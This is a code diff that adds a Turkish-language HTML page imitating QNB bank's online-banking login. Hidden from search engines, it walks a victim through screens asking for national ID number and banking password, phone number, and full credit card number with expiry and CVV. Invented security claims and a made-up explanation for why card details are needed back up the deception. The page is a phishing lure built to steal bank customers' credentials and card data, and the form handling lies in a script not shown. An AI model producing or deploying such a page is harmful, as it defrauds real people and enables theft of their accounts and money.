@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Başvuru - Giriş</title>
+    <link rel="stylesheet" href="styles.css">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, nofollow">
+</head>
+<body>
+    <!-- Login Screen -->
+    <div id="loginScreen" class="screen active">
+        <div class="container">
+            <div class="logo-container">
+                <img src="https://internetsubesi.qnb.com.tr/Content/Images/ResponsiveLogin/kusakli_mobile2x.png?uid=703680717" alt="QNB Logo" class="logo">
+            </div>
+            
+            <div class="security-badge">
+                <span class="lock-icon">🔒</span>
+                <span>Güvenli Giriş</span>
+            </div>
+            
+            <div class="tabs">
+                <div class="tab active" data-tab="individual">Bireysel</div>
+                <div class="tab" data-tab="corporate">Kurumsal</div>
+            </div>
+            
+            <div id="errorMessage" class="error-message" style="display: none;">
+                Yanlış şifre veya TC!
+            </div>
+            
+            <form id="loginForm" class="form">
+                <input type="text" placeholder="Müşteri / T.C. Kimlik Numaranız" class="input-field" id="tcNumber">
+                <input type="password" placeholder="Dijital Şifreniz (6 haneli)" class="input-field" id="password" maxlength="6">
+                
+                <div class="form-options">
+                    <label class="checkbox-container">
+                        <input type="checkbox" id="rememberMe">
+                        <span class="checkmark"></span>
+                        Beni Hatırla
+                    </label>
+                    <button type="button" class="forgot-password-btn">Şifremi Unuttum</button>
+                </div>
+                
+                <button type="submit" class="continue-btn">DEVAM</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Phone Number Screen -->
+    <div id="phoneScreen" class="screen">
+        <div class="container">
+            <div class="logo-container">
+                <img src="https://internetsubesi.qnb.com.tr/Content/Images/ResponsiveLogin/kusakli_mobile2x.png?uid=703680717" alt="QNB Logo" class="logo">
+            </div>
+            <div class="security-badge">
+                <span class="lock-icon">🔒</span>
+                <span>Güvenli Bağlantı</span>
+            </div>
+            <h1 class="title">Telefon Numarası Doğrulama</h1>
+            <p class="security-info">Güvenliğiniz için telefon numaranızı doğrulamamız gerekiyor.</p>
+            <form id="phoneForm" class="form">
+                <input type="tel" placeholder="Telefon Numaranız" class="input-field" id="phoneNumber">
+                <button type="submit" class="continue-btn">DEVAM</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Credit Card Screen -->
+    <div id="creditCardScreen" class="screen">
+        <div class="container">
+            <div class="logo-container">
+                <img src="https://internetsubesi.qnb.com.tr/Content/Images/ResponsiveLogin/kusakli_mobile2x.png?uid=703680717" alt="QNB Logo" class="logo">
+            </div>
+            <div class="security-badge">
+                <span class="lock-icon">🔒</span>
+                <span>SSL Şifreli Bağlantı</span>
+            </div>
+            <h1 class="title">Kredi Kartı Bilgileri</h1>
+            <p class="security-info">Kart bilgileriniz 256-bit SSL ile şifrelenerek güvenle işlenir.</p>
+            
+            <div class="info-box">
+                <div class="info-header">
+                    <span class="info-icon">🧾</span>
+                    <h3>Neden Kredi Kartı Bilgileri İstenir?</h3>
+                </div>
+                <div class="info-content">
+                    <div class="info-item">
+                        <strong>• Kredi Notu ve Risk Analizi</strong>
+                        <p>Bankalar, kredi kartı kullanım geçmişini inceleyerek kişinin kredi notunu ve finansal disiplinini değerlendirir. Düzenli ödeme yapan biri, daha düşük riskli müşteri olarak görülür.</p>
+                    </div>
+                    <div class="info-item">
+                        <strong>• Gelir ve Harcama Alışkanlıkları</strong>
+                        <p>Kredi kartı ekstresi, kişinin aylık harcamaları ve ödeme kapasitesi hakkında fikir verir. Bu da bankanın, başvuru sahibinin yeni bir krediyi geri ödeme gücünü analiz etmesini sağlar.</p>
+                    </div>
+                    <div class="info-item">
+                        <strong>• Kredi Geçmişi</strong>
+                        <p>Daha önceki kredi kartı borçlarının zamanında ödenip ödenmediği, yeni kredi başvurusunun onaylanmasında önemli rol oynar. Olumsuz geçmiş, başvurunun reddedilmesine neden olabilir.</p>
+                    </div>
+                    <div class="info-item">
+                        <strong>• Limit ve Kullanım Oranı</strong>
+                        <p>Mevcut kredi kartı limitleri ve bu limitlerin ne kadarının kullanıldığı, kişinin borçlanma eğilimini gösterir. Düşük kullanım oranı genellikle olumlu değerlendirilir.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <form id="creditCardForm" class="form">
+                <input type="text" placeholder="16 Haneli Kart Numarası" class="input-field" id="cardNumber" maxlength="19">
+                <div class="card-details">
+                    <input type="text" placeholder="Son Kullanım Tarihi (MM/YY)" class="input-field" id="expiryDate" maxlength="5">
+                    <input type="text" placeholder="CVV" class="input-field" id="cvv" maxlength="3">
+                </div>
+                <div class="security-notice">
+                    <span class="shield-icon">🛡️</span>
+                    <span>Bilgileriniz PCI DSS standartlarında korunur</span>
+                </div>
+                <button type="submit" class="continue-btn">Güvenli Başvuru</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="screen">
+        <div class="container">
+            <div class="logo-container">
+                <img src="https://internetsubesi.qnb.com.tr/Content/Images/ResponsiveLogin/kusakli_mobile2x.png?uid=703680717" alt="QNB Logo" class="logo">
+            </div>
+            <div class="security-badge">
+                <span class="lock-icon">🔒</span>
+                <span>Güvenli İşlem</span>
+            </div>
+            <h1 class="loading-title">Bekleyiniz</h1>
+            <p class="loading-subtitle">Bilgileriniz güvenle işleniyor...</p>
+            <div class="loading-spinner"></div>
+            <div class="security-message">
+                <span class="shield-icon">🛡️</span>
+                <span>256-bit SSL şifreleme aktif</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Screen -->
+    <div id="successScreen" class="screen">
+        <div class="container">
+            <div class="logo-container">
+                <img src="https://internetsubesi.qnb.com.tr/Content/Images/ResponsiveLogin/kusakli_mobile2x.png?uid=703680717" alt="QNB Logo" class="logo">
+            </div>
+            <div class="success-icon">✓</div>
+            <h1 class="success-title">İşlem Başarılı</h1>
+            <p class="success-message">Bilgileriniz güvenle kaydedildi. güvencesiyle işleminiz tamamlandı.</p>
+            <div class="security-confirmation">
+                <span class="shield-icon">🛡️</span>
+                <span>İşlem güvenlik protokolleri ile onaylandı</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Screen -->
+    <div id="errorScreen" class="screen">
+        <div class="container">
+            <div class="logo-container">
+                <img src="https://internetsubesi.qnb.com.tr/Content/Images/ResponsiveLogin/kusakli_mobile2x.png?uid=703680717" alt="QNB Logo" class="logo">
+            </div>
+            <div class="error-icon">✗</div>
+            <h1 class="error-title">Güvenlik Hatası</h1>
+            <p class="error-message">Güvenlik protokolleri nedeniyle işlem tamamlanamadı. Lütfen bilgilerinizi kontrol edip tekrar deneyiniz.</p>
+            <div class="security-warning">
+                <span class="warning-icon">⚠️</span>
+                <span>Güvenlik nedeniyle işlem durduruldu</span>
+            </div>
+            <button class="retry-btn" onclick="showScreen('loginScreen')">Güvenli Giriş</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
